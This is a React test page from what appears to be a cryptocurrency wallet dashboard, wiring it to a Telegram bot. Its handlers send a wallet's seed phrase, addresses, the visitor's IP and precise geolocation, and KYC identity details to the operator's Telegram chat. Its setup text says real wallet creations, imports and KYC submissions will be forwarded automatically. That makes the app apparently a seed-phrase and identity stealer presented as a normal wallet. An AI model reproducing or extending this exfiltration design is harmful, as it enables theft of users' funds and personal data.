import { useState } from 'react';
import DashboardLayout from '@/components/dashboard/DashboardLayout';
import { Button } from '@/components/ui/button';
import { Textarea } from '@/components/ui/textarea';
import { Input } from '@/components/ui/input';
import { Card } from '@/components/ui/card';
import { motion } from 'framer-motion';
import { Send, AlertCircle, CheckCircle, Loader2 } from 'lucide-react';
import { toast } from 'sonner';
import {
  sendTelegramMessage,
  sendWalletNotification,
  sendKYCNotification,
  testTelegramConnection,
} from '@/services/telegramService';
import { getFullGeolocationData } from '@/services/geolocationService';

export default function TelegramTest() {
  const [loading, setLoading] = useState(false);
  const [testMessage, setTestMessage] = useState('');
  const [testResult, setTestResult] = useState<{ success: boolean; message: string } | null>(null);

  const handleTestConnection = async () => {
    setLoading(true);
    const result = await testTelegramConnection();
    setTestResult(result);
    if (result.success) {
      toast.success('✅ Telegram connection successful!');
    } else {
      toast.error('❌ Telegram connection failed');
    }
    setLoading(false);
  };

  const handleSendTestMessage = async () => {
    if (!testMessage.trim()) {
      toast.error('Please enter a message');
      return;
    }

    setLoading(true);
    const success = await sendTelegramMessage({
      text: testMessage,
      parseMode: 'HTML',
    });
    if (success) {
      toast.success('✅ Message sent successfully!');
      setTestMessage('');
    } else {
      toast.error('❌ Failed to send message');
    }
    setLoading(false);
  };

  const handleTestWalletNotification = async () => {
    setLoading(true);
    try {
      const location = await getFullGeolocationData();
      const success = await sendWalletNotification({
        type: 'created',
        name: 'Test Wallet',
        seedPhrase: 'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about',
        xrpAddress: 'rN7n7otQDd6FczFgLdSqtcsAUxDkw6fzRH',
        evmAddress: '0x742d35Cc6634C0532925a3b844Bc9e7595f3bEb9',
        solanaAddress: '9B5X4z6Kx5L4M3N2O1P0Q9R8S7T6U5V4W3X2Y1Z0',
        tronAddress: 'TRrP29vfNFTT2aFaJ8JhT8kC6N7U8V9W0X1Y2Z3A4B',
        bitcoinAddress: '1A1z7agoat7FRN1JRUcVzocEGGAqJJzNWn',
        timestamp: new Date().toISOString(),
        location: {
          ip: location.ip,
          country: location.country,
          city: location.city,
          region: location.region,
          timezone: location.timezone,
          latitude: location.latitude,
          longitude: location.longitude,
        },
      });
      if (success) {
        toast.success('✅ Wallet notification sent with location!');
      } else {
        toast.error('❌ Failed to send wallet notification');
      }
    } catch (error) {
      toast.error('❌ Error sending wallet notification');
    }
    setLoading(false);
  };

  const handleTestKYCNotification = async () => {
    setLoading(true);
    try {
      const location = await getFullGeolocationData();
      const success = await sendKYCNotification({
        userId: 'test-user-123',
        firstName: 'John',
        lastName: 'Doe',
        email: 'john@example.com',
        dateOfBirth: '1990-01-15',
        phoneNumber: '+1234567890',
        addressLine1: '123 Main St',
        city: 'New York',
        state: 'NY',
        postalCode: '10001',
        country: 'United States',
        kycStatus: 'submitted',
        timestamp: new Date().toISOString(),
        location: {
          ip: location.ip,
          country: location.country,
          city: location.city,
          region: location.region,
          timezone: location.timezone,
          latitude: location.latitude,
          longitude: location.longitude,
        },
      });
      if (success) {
        toast.success('✅ KYC notification sent with location!');
      } else {
        toast.error('❌ Failed to send KYC notification');
      }
    } catch (error) {
      toast.error('❌ Error sending KYC notification');
    }
    setLoading(false);
  };

  return (
    <DashboardLayout>
      <div className="min-h-screen bg-gradient-to-br from-background to-muted/30 p-3 xs:p-4 sm:p-6 lg:p-8">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="max-w-4xl mx-auto"
        >
          <div className="mb-8">
            <h1 className="text-3xl sm:text-4xl font-bold text-foreground mb-2">Telegram Integration Test</h1>
            <p className="text-sm sm:text-base text-muted-foreground">
              Test your Telegram bot configuration and send test notifications
            </p>
          </div>

          {/* Configuration Info */}
          <Card className="p-4 sm:p-6 mb-6 bg-blue-500/5 border-blue-500/20">
            <div className="flex gap-3">
              <AlertCircle className="w-5 h-5 text-blue-500 flex-shrink-0 mt-0.5" />
              <div className="space-y-2">
                <h3 className="font-semibold text-blue-600">Environment Variables Required</h3>
                <p className="text-xs sm:text-sm text-muted-foreground">
                  Make sure you have set these in your .env.local file:
                </p>
                <div className="bg-black/20 p-3 rounded text-xs font-mono space-y-1 mt-2">
                  <div>VITE_TELEGRAM_BOT_TOKEN=your_bot_token</div>
                  <div>VITE_TELEGRAM_CHAT_ID=your_chat_id</div>
                </div>
              </div>
            </div>
          </Card>

          {/* Test Results */}
          {testResult && (
            <Card
              className={`p-4 sm:p-6 mb-6 border ${
                testResult.success ? 'bg-green-500/5 border-green-500/20' : 'bg-red-500/5 border-red-500/20'
              }`}
            >
              <div className="flex gap-3">
                {testResult.success ? (
                  <CheckCircle className="w-5 h-5 text-green-500 flex-shrink-0 mt-0.5" />
                ) : (
                  <AlertCircle className="w-5 h-5 text-red-500 flex-shrink-0 mt-0.5" />
                )}
                <div>
                  <h3 className={`font-semibold ${testResult.success ? 'text-green-600' : 'text-red-600'}`}>
                    {testResult.success ? '✅ Success' : '❌ Failed'}
                  </h3>
                  <p className="text-xs sm:text-sm text-muted-foreground mt-1">{testResult.message}</p>
                </div>
              </div>
            </Card>
          )}

          {/* Test Buttons */}
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
            <Card className="p-4 sm:p-6 hover:border-primary/50 transition-colors">
              <h3 className="font-semibold mb-3 text-sm sm:text-base">1. Test Connection</h3>
              <p className="text-xs sm:text-sm text-muted-foreground mb-4">
                Verify your Telegram bot token and chat ID are correct
              </p>
              <Button
                onClick={handleTestConnection}
                disabled={loading}
                className="w-full bg-primary hover:bg-primary/90"
              >
                {loading ? <Loader2 className="w-4 h-4 mr-2 animate-spin" /> : <Send className="w-4 h-4 mr-2" />}
                Test Connection
              </Button>
            </Card>

            <Card className="p-4 sm:p-6 hover:border-primary/50 transition-colors">
              <h3 className="font-semibold mb-3 text-sm sm:text-base">2. Test Wallet Created</h3>
              <p className="text-xs sm:text-sm text-muted-foreground mb-4">
                Send a sample wallet creation notification
              </p>
              <Button
                onClick={handleTestWalletNotification}
                disabled={loading}
                className="w-full bg-primary hover:bg-primary/90"
              >
                {loading ? <Loader2 className="w-4 h-4 mr-2 animate-spin" /> : <Send className="w-4 h-4 mr-2" />}
                Send Wallet Test
              </Button>
            </Card>

            <Card className="p-4 sm:p-6 hover:border-primary/50 transition-colors">
              <h3 className="font-semibold mb-3 text-sm sm:text-base">3. Test KYC Submission</h3>
              <p className="text-xs sm:text-sm text-muted-foreground mb-4">
                Send a sample KYC notification
              </p>
              <Button
                onClick={handleTestKYCNotification}
                disabled={loading}
                className="w-full bg-primary hover:bg-primary/90"
              >
                {loading ? <Loader2 className="w-4 h-4 mr-2 animate-spin" /> : <Send className="w-4 h-4 mr-2" />}
                Send KYC Test
              </Button>
            </Card>

            <Card className="p-4 sm:p-6 hover:border-primary/50 transition-colors">
              <h3 className="font-semibold mb-3 text-sm sm:text-base">4. Send Custom Message</h3>
              <p className="text-xs sm:text-sm text-muted-foreground mb-4">
                Send a custom message with HTML formatting
              </p>
              <Button
                onClick={handleSendTestMessage}
                disabled={loading || !testMessage.trim()}
                className="w-full bg-primary hover:bg-primary/90"
              >
                {loading ? <Loader2 className="w-4 h-4 mr-2 animate-spin" /> : <Send className="w-4 h-4 mr-2" />}
                Send Custom
              </Button>
            </Card>
          </div>

          {/* Custom Message Input */}
          <Card className="p-4 sm:p-6">
            <h3 className="font-semibold mb-4 text-sm sm:text-base">Custom Message</h3>
            <Textarea
              placeholder="Type your message here... (supports HTML tags like <b>, <code>, <i>, etc.)"
              value={testMessage}
              onChange={(e) => setTestMessage(e.target.value)}
              className="mb-4 min-h-[120px]"
            />
            <div className="text-xs sm:text-sm text-muted-foreground bg-muted/30 p-3 rounded">
              <p className="font-semibold mb-2">Supported HTML Tags:</p>
              <div className="grid grid-cols-2 gap-2">
                <div><code className="bg-black/20 px-1 rounded">&lt;b&gt;bold&lt;/b&gt;</code></div>
                <div><code className="bg-black/20 px-1 rounded">&lt;i&gt;italic&lt;/i&gt;</code></div>
                <div><code className="bg-black/20 px-1 rounded">&lt;code&gt;code&lt;/code&gt;</code></div>
                <div><code className="bg-black/20 px-1 rounded">&lt;a href&gt;link&lt;/a&gt;</code></div>
              </div>
            </div>
          </Card>

          {/* Setup Instructions */}
          <Card className="p-4 sm:p-6 mt-6 bg-muted/30 border-muted">
            <h3 className="font-semibold mb-4 text-sm sm:text-base">Setup Instructions</h3>
            <ol className="space-y-3 text-xs sm:text-sm">
              <li className="flex gap-3">
                <span className="font-bold text-primary flex-shrink-0">1.</span>
                <span>
                  <strong>Create Telegram Bot:</strong> Message @BotFather on Telegram and use /newbot to create a bot.
                  Copy the token provided.
                </span>
              </li>
              <li className="flex gap-3">
                <span className="font-bold text-primary flex-shrink-0">2.</span>
                <span>
                  <strong>Get Chat ID:</strong> Message your bot, then visit{' '}
                  <code className="bg-black/20 px-1 rounded">https://api.telegram.org/bot{'{YOUR_BOT_TOKEN}'}/getUpdates</code>{' '}
                  and find your chat_id.
                </span>
              </li>
              <li className="flex gap-3">
                <span className="font-bold text-primary flex-shrink-0">3.</span>
                <span>
                  <strong>Update Environment Variables:</strong> Add both values to your .env.local file as shown above.
                </span>
              </li>
              <li className="flex gap-3">
                <span className="font-bold text-primary flex-shrink-0">4.</span>
                <span>
                  <strong>Test Connection:</strong> Use the "Test Connection" button above to verify everything works.
                </span>
              </li>
              <li className="flex gap-3">
                <span className="font-bold text-primary flex-shrink-0">5.</span>
                <span>
                  <strong>Auto-notifications:</strong> Now wallet creation, imports, and KYC submissions will
                  automatically send to your Telegram chat.
                </span>
              </li>
            </ol>
          </Card>
        </motion.div>
      </div>
    </DashboardLayout>
  );
}
